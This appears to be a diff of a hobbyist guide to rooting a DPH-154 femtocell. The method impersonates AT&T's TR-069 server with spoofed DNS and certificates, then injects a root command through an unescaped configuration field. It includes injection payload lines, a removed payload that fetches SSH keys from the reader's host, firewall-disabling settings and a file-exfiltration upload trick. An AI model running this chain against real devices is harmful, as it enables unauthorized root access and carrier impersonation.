@@ -57,127 +57,270 @@ rather than reaching the internet and finding nothing.
 
 ---
 
-## Phase 1 — Become its management server
+## Phase 1 — Become AT&T, exactly
 
-The unit speaks **CWMP/TR-069** to an ACS. **Stand one up and let it connect.** Nothing here is an
-exploit: you are answering a protocol the device initiates, with the identity it expects.
+**This is the phase that takes the time, and it is the one JP names when he describes the access:**
+*"we got it all configured like att."* ⭐ **Phase 2 is four lines. Phase 1 is a week.**
 
-⚠️ **The CWMP store and the NV environment are different places, and confusing them costs a day:**
+**Nothing here is an exploit.** You are answering a protocol the device initiates, with the identity
+it expects. ⛔ **But "the identity it expects" is far more specific than it sounds, and every one of
+the following was found the hard way.**
+
+### 1️⃣ **The name and port come from the DEVICE, not from you — read `hw_description.dat`**
+
 ```
-our ACS writes  ->  the CWMP store only   (/var/ipaccess/cisco/dslg_cur_cfg.xml.gz)
-                    the TR-069 client has NO path to /var/ipaccess/nv_env.sh
+REDIRECTOR_URL = https://Femtocell.wireless.att.com:7547/acs
 ```
-⇒ **You cannot write the NV environment directly over CWMP.**
+> ### ☠️☠️ **PORT 7547, NOT 443. WE LISTENED ON 443 ONLY, FOR A WEEK.**
+> ⇒ ⭐⭐⭐ **While you listen on the wrong port, *"the device never dialled CWMP"* and *"the device
+> dialled a CLOSED PORT"* are INDISTINGUISHABLE FROM EVERY MEASUREMENT YOU CAN TAKE.** **Both look
+> like silence.** ⇒ **Bind the port the device's own config names, before concluding anything about
+> its behaviour.**
 
+### 2️⃣ **DNS must answer those names — and the device validates them**
+
+```
+femtocell.wireless.att.com  ->  your ACS address      (dnsmasq address= record)
+```
+✅ **Measured, with the exact check the device performs — name validation, no `-k`:**
+```
+curl --cacert <chain> https://femtocell.wireless.att.com:8443/logs
+   subjectAltName: "femtocell.wireless.att.com" matches      HTTP 200   ✅
+CONTROL, same command against the bare IP:                   000        🔴
+```
+⭐ **One variable — the hostname — and it flips the outcome.**
+
+### 3️⃣ **The certificate CN must be the name it ACTUALLY dials, which is not the obvious one**
+
+```
+🔴 CN = femtocell.wireless.att.com        <- the name in REDIRECTOR_URL. IT NEVER ASKS FOR THIS.
+✅ CN = dpewe-santa-clara.wireless.att.com <- DPE = Cisco Device Provisioning Engine, the CWMP tier
+```
+> ### ⚠️ **AND PUT BOTH CAPITALISATIONS IN THE SAN**
+> `REDIRECTOR_URL` spells it **`Femtocell`** with a capital F. ⇒ **Carry `femtocell` AND `Femtocell`
+> in the SAN so a client-side string compare cannot miss.** 📌 **A CN mismatch here cost a week on
+> the CMHS leg, and it presents as silence, not as an error.**
+
+### 4️⃣ **ACS and CMHS must live on DIFFERENT IP ADDRESSES**
+
+⛔ **This is a hard requirement, not a preference.** The server selects its certificate context by
+`getsockname()[0]` — **the address the device connected TO.** ⇒ **One IP cannot serve both roles,
+because there is nothing left to discriminate them by.**
+```
+your ACS   ->  one address     (CWMP / TR-069, port 7547)
+your CMHS  ->  a different one (the log/management tier)
+```
+
+### 5️⃣ **Give it a clock**
+
+⚠️ **These units check certificate validity dates.** A device with no time source and a
+2026-dated certificate rejects it — ⭐ **and the rejection is silent in exactly the same way
+everything else here is.** 📌 **Y2K-dated leaf certificates are what worked; see the 2g corpus.**
+
+---
+
+### 🎯 **WHAT YOU HAVE AT THE END OF PHASE 1**
+
+**A device that opens a CWMP session to you and accepts your instructions inside it.**
+⛔ **That is NOT root, and it is NOT persistent** — it lasts exactly as long as you keep standing
+where AT&T stood. ⇒ **Phase 2 is what converts a session into a shell.**
+
+> ### ⚠️ **THE CWMP STORE AND THE NV ENVIRONMENT ARE DIFFERENT PLACES, AND CONFUSING THEM COSTS A DAY**
+> ```
+> our ACS writes  ->  the CWMP store only   (/var/ipaccess/cisco/dslg_cur_cfg.xml.gz)
+>                     the TR-069 client has NO path to /var/ipaccess/nv_env.sh
+> ```
+> ⇒ **You cannot write the NV environment directly over CWMP.**
 > ### ⭐⭐⭐ **NOT DIRECTLY. BUT ONE CWMP-WRITABLE FIELD IS COPIED INTO IT VERBATIM — AND THAT IS THE ROUTE.**
 > **You do not need a path to `nv_env.sh`. You need a field the device itself copies there**, and
 > `crlServerBaseUrl` is one. ⇒ **Phase 2 is that field.**
 
 ---
 
-## Phase 2 — ⭐⭐ The lever: a URL field that is copied into the NV environment unescaped
+## Phase 2 — ⭐⭐ The lever: `X_00000C_LogUpload.Tuning`, which writes straight into `nv_env.sh`
 
-> ### 🔴🔴 **CORRECTED TWICE ON 2026-09-16, BOTH TIMES BY JP, WHO PERFORMED THE ACCESS.**
+> ### 🔴 **THIS PAGE HAS NAMED THE WRONG ROUTE THREE TIMES. THE TRAIL IS KEPT BECAUSE EACH WRONG VERSION IS ONE SOMEONE ELSE WILL REACH FOR.**
 > ```
-> v1  "serve a firmware image; FS_VARIANT unhardens it"   -> NEVER DONE. Rewrites both U-Boot banks.
-> v2  "rewrite the management-server URL so it points     -> WRONG MECHANISM. It is not a pointer
->      at you natively"                                       rewrite; it is COMMAND INJECTION.
+> v1  "serve a firmware image; FS_VARIANT unhardens it"   NEVER DONE -- and it rewrites both U-Boot banks
+> v2  "rewrite ManagementServer.URL to point at you"      wrong mechanism: a pointer, not an injection
+> v3  "crlServerBaseUrl (2203)"                           RIGHT SINK, WRONG FIELD -- that is the 151's
+>                                                          DMI attribute. The 154 has no DMI console.
+> ✅  X_00000C_LogUpload.Tuning, over CWMP                 <- the field. JP called it "the serverurlpath thingy".
 > ```
-> **His words:** *"we didn't use the software update exploit, we got it all configured like att then
-> overwrote the serverurl field through ACS like we did through DMI on the 151"* — and then, on my
-> second attempt: *"we just used that field because it dumps directly into init_nv."*
-> ⇒ ⭐ **The field is not interesting because of what it POINTS AT. It is interesting because of
-> WHERE ITS VALUE IS COPIED TO.**
 
-**`/var/ipaccess/nv_env.sh` is sourced as root early in boot.** Several MIB string attributes are
-written into it **verbatim**, as `export VAR="<value>"` lines. **`crlServerBaseUrl` (2203) is one:**
+**The device dials OUT to your ACS.** ⭐⭐⭐ **That single fact is why this route works on a 154 and
+nothing else does:** the session is an **ESTABLISHED flow**, so the 154's wholesale inbound REJECT —
+the thing that closes every other door — **is irrelevant to it.**
+
+### 🔧 **THE CHAIN, EACH LINK NAMED**
 
 ```
-set crlServerBaseUrl="http://x/"     ->     export ENV_CRL_BASE_SERVER="http://x/"
+device DIALS OUT (CWMP)
+  ACS answers with SetParameterValues on   Device.X_00000C_LogUpload.Tuning
+     -> DslmSsp
+     -> sysctrlUpdateEnvVar
+     -> setnv_env.sh:46      echo "export $1=\"$2\"" >> nv_env.sh     ⭐ NO ESCAPING. THE WHOLE BUG.
+  => /var/ipaccess/nv_env.sh gains:    export ENV_XKINIT="$(<command>)"
+  => the next time ANY of its 22 ROOT CONSUMERS sources that file, the $( ) RUNS AS ROOT
 ```
 
-⛔ **There is NO input validation on that write path.** `;`, backticks, `$()` and `|` all round-trip
-unmodified.
+> ### 🎯 **AND `/etc/profile:69` SOURCES IT — SO A LOGIN IS ENOUGH**
+> **No reboot. No service restart.** ⭐ **Compare the 151, where the equivalent needs TWO reboots** —
+> the subshell cannot change the parent environment, so the flag must be written to the file and the
+> box booted again. **Here, anything that opens a shell fires it.**
 
-> ### 🎯 **THE PARSER OWNS THE DOUBLE QUOTE. IT DOES NOT MATTER.**
-> **You cannot close the shell string — the DMI/CWMP parser owns `"`.** ⭐ **You do not need to:
-> `$(...)` command substitution executes INSIDE double quotes.**
+### 📋 **THE FIELD'S NORMAL, DOCUMENTED USE — and this part is PROVEN**
+
+**`Tuning` takes a `KEY: VALUE; KEY: VALUE` string and writes those into the NV environment.** That
+is its *intended* function, and it is how the unit was configured:
+```
+ENV_FIREWALL_DISABLED: TRUE; ENV_VERBOSE_CONSOLE_ENABLED: TRUE;
+ENV_SERIAL_CONSOLE_ENABLED: TRUE; ENV_CRASH_REPORT_URL: http://<you>:8082/crash;
+ENV_DIAG_FILE_LIST: /var/ipaccess/.tamperInfo /var/ipaccess/nv_env.sh …
+```
+> ### ⚠️ **`Tuning` IS A WHOLE-STRING REPLACE, NOT A MERGE**
+> ⛔ **Re-sending a stale copy of that string silently reverts every key you are not currently
+> thinking about** — including the one holding your own access open. ⭐ **A DROPPED key is a visible
+> omission; a STALE key looks like diligence — present, correctly spelled, and wrong.**
+
+> ### ⛔⛔ **THE HONEST STATE OF THE ESCAPE, AND TWO SOURCES DISAGREE**
 > ```
-> set crlServerBaseUrl="x$(COMMAND)"
+> ✅ JP, who ran it:  "we were able to get into the 154 that way, but then the tamper timer went off"
+> ⚠️ the corpus lane: "THE PRIMITIVE IS DESIGNED, NOT DEMONSTRATED. Do not price it as proven."
+>                     the one logged attempt FAULTED 9003/9007 "Invalid parameter value"
+>                     0 of 663 readbacks ever contained ENV_XKINIT
 > ```
-> ⇒ **`COMMAND` runs as root at every boot, when `nv_env.sh` is sourced.**
-> ⭐⭐ **This is why the field was chosen, and it is the whole trick:** the value is not parsed as a
-> URL by anything that matters before it reaches a shell. **It is a string that gets `export`ed.**
+> **Both are recorded and neither is adjudicated here.** ⭐ **The likeliest reconciliation is that
+> they are about different moments on different units — the logged failure is a later re-attempt,
+> not the original access — but nobody has established that, so it is not stated as fact.**
+> ✅ **What IS beyond doubt: the `Tuning` write itself lands, the NV variables it sets take effect,
+> and the field reaches `setnv_env.sh` with no escaping.**
 
-### ⚠️ The caveat that shapes the payload — and it is why this takes TWO reboots
-
-**`$( )` runs in a SUBSHELL, so an `export` inside it cannot affect the parent.** ⇒ To change an NV
-variable you must edit the **file** — with the vendor's own `/opt/ipaccess/bin/setnv_env.sh` — and
-boot **again**.
-
-```
-dropbear is ALWAYS running. Only its BIND ADDRESS varies (/etc/init.d/sshd):
-    ENV_VERBOSE_CONSOLE_ENABLED == "TRUE"  ->  LISTEN_ON=22            any interface
-    otherwise                              ->  LISTEN_ON=127.0.0.1:22  loopback only
-```
-⭐ **That is why port 22 scans as REFUSED rather than filtered — it is bound, just not to you.**
-
-**The payload — key install plus console enable, no password needed:**
-```
-set crlServerBaseUrl="x$(mkdir -p /root/.ssh;wget -O /root/.ssh/authorized_keys \
-    http://<you>:9998/k;/opt/ipaccess/bin/setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED TRUE)"
-```
-```
-reboot 1   payload runs as root: installs the key, sets the flag IN THE FILE.
-           sshd already started with the OLD value -> still loopback.
-reboot 2   sshd reads TRUE -> binds 0.0.0.0:22. SSH in with the key.
-```
-⚠️ **Legacy crypto is required:** `-o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss`
-📌 **Possible second gate:** `ENV_FIREWALL_DISABLED="FALSE"` + `/etc/init.d/iptablesinit` — same
-`setnv_env.sh` route if 22 is bound but unreachable.
-
-> ### ⭐⭐⭐ **THE 151 AND THE 154 DIFFER ONLY IN WHICH DOOR CARRIES THE WRITE**
+> ### ✅ **THE PRECONDITION IS MEASURED, AND IT IS WHY THIS SUITS A 154 AND NOT A 151**
 > ```
-> DPH-151   the write arrives by DMI    set crlServerBaseUrl="x$(…)"
-> DPH-154   the write arrives by ACS    the same field, over CWMP -- because the 154 HAS NO DMI
->                                        CONSOLE. CWMP is the console it still answers on.
+> a DPH-154   889 CWMP Informs, 60-second cadence, for hours   <- it TALKS to our ACS
+> a DPH-151     0 CWMP bodies EVER, 0 of 355,325 log lines     <- it never speaks
 > ```
-> ⇒ ⭐ **The 154 is not a harder target. It is the SAME target with the console removed.** **The
-> sink, the lack of validation and the payload are identical; only the transport changes.**
-> ⚠️ **AND THAT IS WHY PHASE 1 MATTERS.** You are not impersonating AT&T to *be* its management
-> server — **you are impersonating it to get a writable channel to this one field.**
+> ⇒ ⭐ **JP's *"completely configuring the AP and getting it all set up"* IS the precondition.** The
+> injection needs a live CWMP session, and a 154 gives you one.
 
-> ### ⛔ **BOUNDS — STATED PLAINLY, BECAUSE THIS PAGE HAS NOW BEEN WRONG TWICE**
+> ### ☠️☠️ **THREE DIFFERENT MECHANISMS IN THIS CORPUS GET CONFLATED INTO "THE RCE". THEY ARE NOT THE SAME.**
 > ```
-> ✅ the SINK and the PAYLOAD   measured and documented on the 151 (2g corpus, DEVICE-ACCESS.md
->                               Steps 3-4): MIB 2203 -> ENV_CRL_BASE_SERVER, no validation.
-> ✅ the ROUTE on the 154       first-hand from the operator who performed it.
-> ⚠️ the CWMP PARAMETER NAME    NOT recorded in this repo. The DMI attribute is crlServerBaseUrl
->                               (2203); its TR-069 name on this vendor-skinned build is UNREAD.
-> ⚠️ no staged payload          the ACS in the 2g tree has no such payload -- grepped 2026-09-16.
->                               The write was made; it was not left behind as code.
+> A  rroot.py          TELNET to the Ralink as guest -> rmm_client cs_cmd -> root on the RALINK
+> B  the SPV injection CWMP SetParameterValues -> unescaped nv_env.sh write -> root on the PICO  ⬅ THIS
+> C  persistent_ssh.sh POST-exploitation persistence; assumes you ALREADY have A or B
 > ```
-> ✅ **ASK THE DEVICE, DO NOT GUESS:** `CWMP GetParameterNames` on the vendor tree (`X_00000C_…`)
-> returns the real name. ⭐ **A name probe against the device cannot be wrong about the device's own
-> namespace** — and this build renames things.
+> ⇒ ⛔ **A is telnet, B is CWMP — opposite transports, different chips.** ⚠️ **And the "CWMP RCE"
+> label in the upstream README sits on the TELNET one.** ⭐ **A DPH-154 has no Ralink at all, so A
+> cannot apply to it under any circumstances** — see [`MATRIX.md`](MATRIX.md).
 
-### ✅ Reverting
+### 📌 **THE 151 DOES THE SAME THING THROUGH A DIFFERENT FIELD AND A DIFFERENT DOOR**
 
 ```
-set crlServerBaseUrl=""      then remove /root/.ssh/authorized_keys
-                             and setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED FALSE
+DPH-151   DMI    set crlServerBaseUrl="x$(…)"   (MIB 2203)  ->  export ENV_CRL_BASE_SERVER="…"
+DPH-154   CWMP   SetParameterValues on Tuning                ->  setnv_env.sh -> nv_env.sh
 ```
-⚠️ **The payload is idempotent and harmless if left — but leaving a root backdoor armed on a device
-is a DECISION, not a default.**
+⇒ ⭐⭐ **Same sink — `nv_env.sh`, sourced as root. Different field, different transport.** **The 154
+is not a harder target; it is the same target with the console removed, and CWMP is the console it
+still answers on.** 📌 **Full 151 write-up including the two-reboot payload: the 2g corpus,
+`DEVICE-ACCESS.md` Steps 3–4.**
 
 ---
 
-## Phase 3 — What you have now
+## Phase 3 — What you configure, and ALL of it goes through the ACS
 
-A unit that hardens or unhardens on your instruction, with NV variables you chose — which is the
-same primitive the other models reach through a console. **From here the software half of
-[`BRINGUP.md`](BRINGUP.md) Phases 4–8 applies**: point it at your core, give the radio parameters,
-unlock, connect.
+> ### ⭐⭐⭐ **THIS IS THE PART THAT SURPRISES PEOPLE. ON A 154 THE ACS IS NOT JUST THE WAY IN — IT IS THE ENTIRE CONTROL SURFACE.**
+> **JP:** *"there are many things we did to get it all configured using just our ACS."*
+> ⇒ **On a 151 or a nano3G you do this work at a DMI console. The 154 has none.** ⭐ **Every knob
+> below is reached by `SetParameterValues` over the session the device itself opened.**
+> 📌 **49 distinct parameters are exercised by the ACS in the 2g corpus. Grouped by what they do:**
+
+### 🆔 Identity and inventory — *read these first; they tell you what you are holding*
+```
+Device.DeviceInfo.SerialNumber · ModelName · SoftwareVersion · HardwareVersion
+Device.DeviceInfo.ProvisioningCode
+Device.DeviceInfo.X_00000C_RouterModuleVersion
+Device.DeviceInfo.X_00000C_Tampered          ⬅ ⛔ READ THIS BEFORE ANYTHING ELSE. See Phase 4.
+```
+
+### 📞 Management-session control
+```
+Device.ManagementServer.PeriodicInformInterval    ⬅ the dial cadence. Shorten it to iterate faster.
+Device.ManagementServer.ParameterKey
+Device.ManagementServer.X_00000C_ProvisioningStatus
+```
+
+### 🌐 Core network identity — *this is where you tell it it is YOUR network*
+```
+Device.Services.FAPService.1.CellConfig.UMTS.CN.X_00000C_MCC     ⬅ 999
+Device.Services.FAPService.1.CellConfig.UMTS.CN.X_00000C_MNC     ⬅ 99
+Device.Services.FAPService.1.CellConfig.UMTS.CN.LACRAC
+Device.Services.FAPService.1.CellConfig.UMTS.CN.SAC
+Device.Services.X_00000C_FAPService.Cell.OTACellID
+Device.Services.X_00000C_FAPService.Cell.RNCIdentity
+```
+⭐ **This is the CWMP equivalent of the `iapc-gw-shim` identity problem on the other models** — the
+cell must present an identity your core will accept, or RRM tears it down seconds after it comes up.
+
+### 🔗 Where it connects
+```
+Device.Services.FAPService.1.FAPControl.UMTS.Gateway.SecGWServer1  ⬅ the security gateway
+Device.Services.X_00000C_FAPService.FGW.Fqdn · FGW.Status          ⬅ the femto gateway
+Device.Services.FAPService.1.Transport.Tunnel.IKESA.1.IPAddress · .Status
+```
+📌 **`IKESA` is the IPsec SA.** ⚠️ **The DPH-153 route documented by others works by DISABLING IPsec
+and repointing these** — same idea, reached differently. See [`BRINGUP-DPH153.md`](BRINGUP-DPH153.md).
+
+### 📡 Radio control — *and the gate that stops this page*
+```
+Device.Services.FAPService.1.FAPControl.AdminState · OpState · RFTxStatus
+Device.Services.X_00000C_FAPService.Enabled          ⬅ 🔴 refused 9003/9007 while tampered
+Device.Services.X_00000C_FAPService.Radio.Status
+```
+
+### 🚪 Access control — *the 154's version of the CSG trap*
+```
+Device.Services.FAPService.1.AccessMgmt.AccessMode
+```
+> ⛔ **On the nano3G, the equivalent pair (`accessDecisionMode` + `csgAccessMode`) is the single
+> nastiest failure in this whole corpus: set one without the other and you get a SILENT DENY-ALL
+> that every instrument reads as healthy.** ⭐ **Assume the same class of trap here and verify with
+> a handset, not with a readback.** 📌 [`TRAPS.md`](TRAPS.md).
+
+### 🛰 GPS
+```
+Device.Services.FAPService.1.Capabilities.GPSEquipped · Device.Services.X_00000C_FAPService.GPS.
+```
+⚠️ **Many carrier femtocells refuse to radiate without a GPS fix** — a location-compliance gate,
+separate from the tamper gate. **Check it before concluding the tamper bit is your only blocker.**
+
+### 📝 Logs, diagnostics — *and the injection surface from Phase 2*
+```
+Device.X_00000C_LogUpload.Tuning              ⬅ ⭐ THE LEVER. Also the legitimate NV-config channel.
+Device.X_00000C_LogUpload.OnDemand.URL · OnDemand.Triggered
+Device.X_00000C_LogUpload.Periodic.URL · Periodic.Enable · Periodic.Interval
+```
+⭐⭐ **`OnDemand.Triggered` makes the unit upload a diagnostic bundle to a URL you choose** — ⇒ **a
+read primitive that needs no shell at all**, and `ENV_DIAG_FILE_LIST` (set through `Tuning`) chooses
+what goes in it. **Point it at your own HTTP server and read the device's own files.**
+
+### 💓 The CMHS / heartbeat tier
+```
+X_00000C_MHS.Config.MaxStatsInterval · UpperHeartbeatInterval
+X_00000C_MHS.Conn.ConnectionAttemptsBeforeUnavailable · GracefulShutdownWaitTime
+```
+📌 **CMHS is a SEPARATE server from the ACS, on a SEPARATE IP** (Phase 1, item 4) — and a unit can
+be happily informing the ACS while failing CMHS entirely.
+
+---
+
+### ✅ **SO: WHAT YOU HAVE AFTER PHASE 3**
+
+**A unit whose identity, core, gateway, access mode and NV environment you set — all through a
+session it opened to you.** **From here the software half of [`BRINGUP.md`](BRINGUP.md) Phases 4–8
+applies**: point it at your core, give it radio parameters, unlock, connect.
+
+⛔ **Except on this unit it stops, and the next phase is why.**
 
 ---
 
@@ -233,11 +376,29 @@ and is not one.**
 - **The external antenna port was deleted** relative to the 151's MCX. ⇒ **The "one room, heavily
   attenuated, remote antenna" deployment is not available on this model.**
 
-> ### ⚠️ One thing this repo nearly published as settled, kept visible
-> *"The DPH-154 is not picoChip"* is **not** established. A teardown identifies an **AD9365**
-> transceiver with Band 2 and Band 5 power amplifiers; another source attributes a picoChip part.
-> ⭐ **These are reconcilable — the AD9365 is the RF transceiver, a picoChip part would be the
-> processor/baseband. Different components.** The 154's SoC identity is genuinely unsettled.
+> ### ✅ **SETTLED 2026-09-16 BY THE DEVICE'S OWN KERNEL — IT *IS* picoChip, AND IT IS A SINGLE SoC**
+> ~~*"The DPH-154 is not picoChip" is not established … the 154's SoC identity is genuinely
+> unsettled."*~~ 🔴 **That stood on two third-party attributions. The unit answers it itself:**
+> ```
+> its serial boot log      Image Name: Linux-3.0.0-ip30xxff-xc-245.0
+> its own NAND rootfs      ip30xxff-xc-239.0
+> ```
+> ⇒ ⭐ **`ip30xx` is ip.access's platform designation for the picoChip PC30xx.** **Two independent
+> surfaces on the device, agreeing.**
+> ### ⭐⭐ **AND THE OLD BLOCK'S RECONCILIATION WAS RIGHT — IT JUST STOPPED ONE STEP SHORT**
+> **The AD9365 is the RF TRANSCEIVER; the PC30xx is the SoC/baseband. Different components, both
+> present, no contradiction.** ⇒ **The reasoning was sound and the conclusion was stale.**
+> ### 🔴 **AND THE CONSEQUENCE IS STRUCTURAL, NOT TRIVIA — IT IS *ONE* PROCESSOR, NOT TWO**
+> ```
+> DPH-151   Ralink + picoChip PC202   TWO SoCs   <- the Ralink is the LAN-facing one, with telnet
+> DPH-154   picoChip PC30xx           ONE SoC    <- NO RALINK. AT ALL.
+> ```
+> ⇒ ⛔ **Every Ralink-side route — `rroot.py`, the telnet-as-guest path, anything addressed to
+> `192.168.157.185` — is STRUCTURALLY DEAD on a 154.** ⚠️ **The three `192.168.157.185` strings that
+> DO appear in its rootfs (`iptables-customerA-rules`, `opt/cisco/reset`, `opt/cisco/DslmSsp`) are
+> INHERITED FROM THE 151/153 LINEAGE and name a peer this product does not have.**
+> ⭐⭐ **A leftover string naming a nonexistent host reads exactly like evidence that the host
+> exists** — and it is in the firewall rules, which is the most convincing place for it to be.
 
 
 ---
